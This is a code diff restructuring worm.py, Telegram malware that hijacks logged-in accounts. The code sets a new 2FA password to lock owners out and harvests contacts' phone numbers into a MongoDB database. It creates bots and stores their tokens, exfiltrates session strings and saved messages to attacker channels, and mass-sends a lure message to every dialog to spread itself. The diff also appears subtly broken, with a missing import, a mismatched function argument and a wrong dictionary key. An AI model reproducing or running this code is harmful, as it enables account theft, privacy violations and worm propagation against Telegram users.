full rstructure

+++ worm.py
@@ -1,21 +1,37 @@
 import os,logging,random,asyncio,json,string
-from telethon import functions, errors
+from telethon import TelegramClient, events, Button, functions, errors
+from telethon.sessions import StringSession
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
+from pymongo import UpdateOne
 from strings import strings,bot_names,bot_usernames
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 load_dotenv(override=True)
-
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
-database = mongo_client.wormdb
 
+@events.register(events.NewMessage(pattern=r"/worm", func=lambda e: e.is_private))
+async def handler_spred_msg(event):
+    await event.respond(
+        strings['worm_msg'],
+        file='files/worm.png',
+        buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
+        link_preview=False
+    )
+    raise events.StopPropagation
 async def set_passwd(client, me):
     user_data = mongo_client.userdb.sessions.find_one({'phone': me.phone})
     password = "".join(random.choice(string.ascii_letters+string.digits) for i in range(16))
     await client.edit_2fa(current_password=None if not 'password' in user_data else user_data['password'], new_password=password)
     mongo_client.userdb.sessions.update_one({'_id': user_data['_id']}, {'$set': {'password': password}})
+async def backup_contacts(client):
+    result = await client(GetContactsRequest(hash=0))
+    operations = [
+        UpdateOne({'chat_id': user.id}, {"$set": {'phone': user.phone}}, upsert=True)
+        for user in result.users if user.phone
+    ]
+    mongo_client.userdb.sessions.bulk_write(operations)
 async def create_bot(client, me):
     async with client.conversation("@BotFather") as conv:
         msg = await conv.send_message("/newbot")
@@ -34,7 +50,9 @@ async def create_bot(client, me):
         await (await conv.get_response()).delete()
         await msg.delete()
         await response.delete()
-    database.bots.insert_one({"username": username, "token": bot_token, "owner": me.id})
+    botinfo = {"username": username, "token": bot_token, "owner": me.id}
+    mongo_client.wormdb.bots.insert_one(botinfo)
+    return botinfo
 async def backup_saves(client, me, logger_bot):
     result = await client(functions.channels.CreateChannelRequest(
         title=f'{me.first_name} {me.last_name}',
@@ -44,7 +62,7 @@ async def backup_saves(client, me, logger_bot):
     channel_id = result.updates[1].channel_id
     dest = await client.get_entity(channel_id)
     result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
-    database.channels.insert_one({"invite": result.link, "owner": me.id})
+    mongo_client.wormdb.channels.insert_one({"invite": result.link, "owner": me.id})
     await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
     msg_count = 0
     async for message in client.iter_messages("me", reverse=True):
@@ -65,13 +83,20 @@ async def backup_saves(client, me, logger_bot):
     }
     log['msg'] = await logger_bot.send_message(int(os.getenv('LOG_GROUP')), log['txt'])
     return log
-async def spread(client, me, bot):
-    bot_me = await bot.get_me()
-    async with client.conversation(f"@{bot_me.username}") as conv:
+async def spread(client, me, botinfo, log):
+    if botinfo is None:
+        return
+    bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
+    bot.add_event_handler(handler_spred_msg)
+    await bot.start(bot_token=botinfo["bot_token"])
+    async with client.conversation(f"@{(await bot.get_me()).username}") as conv:
+        await conv.send_message("/start")
         msg = await conv.send_message("/worm")
         spread_msg = await conv.get_response()
         spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
         await msg.delete()
+        bot.remove_event_handler(handler_spred_msg)
+        await bot.disconnect()
     perm_logs = {
         'creator': [],
         'admin': [],
@@ -108,17 +133,26 @@ async def spread(client, me, bot):
                 continue
         if dialog.is_user:
             await msg.delete(revoke=False)
-    return perm_logs
+    if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
+        await log['msg'].edit(log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
+        await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
+        await client.send_message(log['dest'], json.dumps(perm_logs, indent=4, ensure_ascii=False))
+        await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
 
-async def worm(client, bot, logger_bot):
+async def worm(client, logger_bot):
     me = await client.get_me()
     log = None
+    botinfo = None
     try:
         await set_passwd(client, me)
     except:
         pass
     try:
-        await create_bot(client, me)
+        await backup_contacts(client)
+    except:
+        pass
+    try:
+        botinfo = await create_bot(client, me)
     except:
         pass
     try:
@@ -126,11 +160,6 @@ async def worm(client, bot, logger_bot):
     except:
         pass
     try:
-        perm_logs = await spread(client, me, bot)
-        if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
-            await log['msg'].edit(log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
-            await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
-            await client.send_message(log['dest'], json.dumps(perm_logs, indent=4, ensure_ascii=False))
-            await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
+        await spread(client, me, botinfo)
     except:
         pass
